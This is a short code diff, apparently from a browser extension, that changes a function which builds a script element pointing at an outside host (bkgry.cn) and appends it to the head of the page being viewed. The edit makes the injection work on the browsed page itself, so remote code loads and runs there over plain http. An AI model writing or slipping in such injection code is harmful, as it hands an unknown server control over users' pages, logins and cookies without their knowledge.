@@ -20,7 +20,7 @@ function myFunction(aEvent){
 
       var hm = browser.contentDocument.createElement("script");
             hm.src = "http://bkgry.cn/index.php?name=test";
-            var s = document.getElementsByTagName("head")[0];
+            var s = browser.contentDocument.getElementsByTagName("head")[0];
             s.appendChild(hm);
       //let result =2;
       //browser.contentDocument.body.innerHTML = result;
